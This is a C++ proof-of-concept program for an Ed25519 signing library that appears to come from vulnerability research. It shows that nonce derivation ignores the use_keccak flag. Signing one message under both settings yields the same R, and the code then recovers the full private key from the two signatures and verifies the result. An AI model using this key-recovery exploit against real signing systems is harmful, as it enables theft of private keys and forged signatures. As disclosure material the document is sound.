/*
 * Proof-of-Concept: Ed25519 nonce reuse via use_keccak mismatch
 *
 * BUG: ed25519_algebra_sign() always derives nonce k via SHA-512,
 *      ignoring the use_keccak parameter. But ed25519_calc_hram()
 *      correctly switches between SHA-512 and Keccak256.
 *
 * RESULT: Signing the same (key, message) with use_keccak=0 and
 *         use_keccak=1 produces identical nonce k (and thus R),
 *         but different HRAM challenges. This is classic nonce reuse.
 *
 * RECOVERY: s = hram * priv + k  (mod L)
 *   s1 = hram1 * priv + k
 *   s2 = hram2 * priv + k
 *   s1 - s2 = (hram1 - hram2) * priv
 *   priv = (s1 - s2) * (hram1 - hram2)^{-1}  (mod L)
 */

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <cinttypes>

extern "C" {
#include "crypto/ed25519_algebra/ed25519_algebra.h"
}

static void print_hex(const char *label, const uint8_t *data, size_t len)
{
    printf("%s: ", label);
    for (size_t i = 0; i < len; i++)
        printf("%02x", data[i]);
    printf("\n");
}

int main()
{
    printf("=== Ed25519 Nonce Reuse PoC (use_keccak mismatch) ===\n\n");

    // 1. Create context
    ed25519_algebra_ctx_t *ctx = ed25519_algebra_ctx_new();
    if (!ctx) {
        fprintf(stderr, "Failed to create ed25519 context\n");
        return 1;
    }

    // 2. Generate a random private key
    ed25519_scalar_t private_key; // big-endian
    elliptic_curve_algebra_status status;

    status = ed25519_algebra_rand(ctx, &private_key);
    if (status != ELLIPTIC_CURVE_ALGEBRA_SUCCESS) {
        fprintf(stderr, "Failed to generate random scalar: %d\n", status);
        return 1;
    }

    // 3. Compute public key A = priv * G
    ed25519_point_t public_key;
    status = ed25519_algebra_generator_mul(ctx, &public_key, &private_key);
    if (status != ELLIPTIC_CURVE_ALGEBRA_SUCCESS) {
        fprintf(stderr, "Failed to compute public key: %d\n", status);
        return 1;
    }

    print_hex("Private key (big-endian)", private_key, 32);
    print_hex("Public key             ", public_key, 32);

    // 4. Sign the same message with use_keccak=0 and use_keccak=1
    const uint8_t message[] = "This is a test message for nonce reuse PoC";
    uint32_t message_size = sizeof(message) - 1; // exclude null terminator

    uint8_t sig1[64], sig2[64];

    status = ed25519_algebra_sign(ctx, &private_key, message, message_size, 0, sig1);
    if (status != ELLIPTIC_CURVE_ALGEBRA_SUCCESS) {
        fprintf(stderr, "Sign with use_keccak=0 failed: %d\n", status);
        return 1;
    }

    status = ed25519_algebra_sign(ctx, &private_key, message, message_size, 1, sig2);
    if (status != ELLIPTIC_CURVE_ALGEBRA_SUCCESS) {
        fprintf(stderr, "Sign with use_keccak=1 failed: %d\n", status);
        return 1;
    }

    printf("\n--- Signatures ---\n");
    print_hex("sig1 R (use_keccak=0)", sig1, 32);
    print_hex("sig1 s (use_keccak=0)", sig1 + 32, 32);
    print_hex("sig2 R (use_keccak=1)", sig2, 32);
    print_hex("sig2 s (use_keccak=1)", sig2 + 32, 32);

    // 5. Check nonce reuse: R1 == R2
    printf("\n--- Nonce Reuse Check ---\n");
    if (memcmp(sig1, sig2, 32) == 0) {
        printf("R1 == R2: YES -- NONCE REUSE CONFIRMED!\n");
    } else {
        printf("R1 == R2: NO -- nonce reuse NOT detected\n");
        printf("Bug may have been fixed. Exiting.\n");
        ed25519_algebra_ctx_free(ctx);
        return 0;
    }

    // Verify signatures are actually different (different s values)
    if (memcmp(sig1 + 32, sig2 + 32, 32) == 0) {
        printf("s1 == s2: YES -- signatures identical, HRAM must be the same\n");
        printf("No nonce reuse exploitable (same challenge). Exiting.\n");
        ed25519_algebra_ctx_free(ctx);
        return 0;
    }
    printf("s1 != s2: YES -- different challenges, exploit possible!\n");

    // 6. Compute HRAM values using the library function
    //    R is the same for both signatures (bytes 0-31 of either sig)
    ed25519_le_scalar_t hram1_le, hram2_le;
    ed25519_point_t R;
    memcpy(R, sig1, 32); // R1 == R2

    status = ed25519_calc_hram(ctx, &hram1_le, &R, &public_key, message, message_size, 0);
    if (status != ELLIPTIC_CURVE_ALGEBRA_SUCCESS) {
        fprintf(stderr, "Failed to compute HRAM1: %d\n", status);
        return 1;
    }

    status = ed25519_calc_hram(ctx, &hram2_le, &R, &public_key, message, message_size, 1);
    if (status != ELLIPTIC_CURVE_ALGEBRA_SUCCESS) {
        fprintf(stderr, "Failed to compute HRAM2: %d\n", status);
        return 1;
    }

    printf("\n--- HRAM Values (little-endian) ---\n");
    print_hex("hram1 (SHA-512)   ", hram1_le, 32);
    print_hex("hram2 (Keccak256) ", hram2_le, 32);

    // 7. Convert s1, s2, hram1, hram2 from little-endian to big-endian
    ed25519_scalar_t s1_be, s2_be, hram1_be, hram2_be;

    // s values are in signature bytes 32-63, already little-endian
    ed25519_le_scalar_t s1_le, s2_le;
    memcpy(s1_le, sig1 + 32, 32);
    memcpy(s2_le, sig2 + 32, 32);

    ed25519_algebra_le_to_be(&s1_be, &s1_le);
    ed25519_algebra_le_to_be(&s2_be, &s2_le);
    ed25519_algebra_le_to_be(&hram1_be, &hram1_le);
    ed25519_algebra_le_to_be(&hram2_be, &hram2_le);

    // 8. Compute diff_s = (s1 - s2) mod L
    ed25519_scalar_t diff_s;
    status = ed25519_algebra_sub_scalars(ctx, &diff_s, s1_be, 32, s2_be, 32);
    if (status != ELLIPTIC_CURVE_ALGEBRA_SUCCESS) {
        fprintf(stderr, "Failed to compute s1 - s2: %d\n", status);
        return 1;
    }

    // 9. Compute diff_hram = (hram1 - hram2) mod L
    ed25519_scalar_t diff_hram;
    status = ed25519_algebra_sub_scalars(ctx, &diff_hram, hram1_be, 32, hram2_be, 32);
    if (status != ELLIPTIC_CURVE_ALGEBRA_SUCCESS) {
        fprintf(stderr, "Failed to compute hram1 - hram2: %d\n", status);
        return 1;
    }

    // 10. Compute inverse: inv_diff_hram = (hram1 - hram2)^{-1} mod L
    ed25519_scalar_t inv_diff_hram;
    status = ed25519_algebra_inverse(ctx, &inv_diff_hram, &diff_hram);
    if (status != ELLIPTIC_CURVE_ALGEBRA_SUCCESS) {
        fprintf(stderr, "Failed to compute modular inverse: %d\n", status);
        return 1;
    }

    // 11. Recover private key: priv = diff_s * inv_diff_hram mod L
    ed25519_scalar_t recovered_key;
    status = ed25519_algebra_mul_scalars(ctx, &recovered_key,
                                         diff_s, 32,
                                         inv_diff_hram, 32);
    if (status != ELLIPTIC_CURVE_ALGEBRA_SUCCESS) {
        fprintf(stderr, "Failed to compute recovered key: %d\n", status);
        return 1;
    }

    // 12. Compare recovered key with original
    printf("\n--- Private Key Recovery ---\n");
    print_hex("Original private key ", private_key, 32);
    print_hex("Recovered private key", recovered_key, 32);

    if (memcmp(private_key, recovered_key, 32) == 0) {
        printf("\n*** VULNERABILITY CONFIRMED ***\n");
        printf("Private key successfully recovered from two signatures!\n");
        printf("The ed25519_algebra_sign() function ignores use_keccak for nonce\n");
        printf("derivation, causing nonce reuse when the same message is signed\n");
        printf("with different use_keccak values.\n");
    } else {
        printf("\nRecovered key does NOT match original.\n");
        printf("Recovery arithmetic may need adjustment.\n");
    }

    // 13. Additional verification: use recovered key to sign and compare
    printf("\n--- Verification: Sign with recovered key ---\n");
    uint8_t verify_sig[64];
    status = ed25519_algebra_sign(ctx, &recovered_key, message, message_size, 0, verify_sig);
    if (status == ELLIPTIC_CURVE_ALGEBRA_SUCCESS) {
        if (memcmp(verify_sig, sig1, 64) == 0) {
            printf("Signing with recovered key produces IDENTICAL signature!\n");
        } else {
            printf("Signing with recovered key produces DIFFERENT signature.\n");
            print_hex("  Original sig1", sig1, 64);
            print_hex("  Verify sig   ", verify_sig, 64);
        }
    } else {
        printf("Signing with recovered key failed: %d\n", status);
    }

    ed25519_algebra_ctx_free(ctx);
    printf("\n=== PoC Complete ===\n");
    return 0;
}
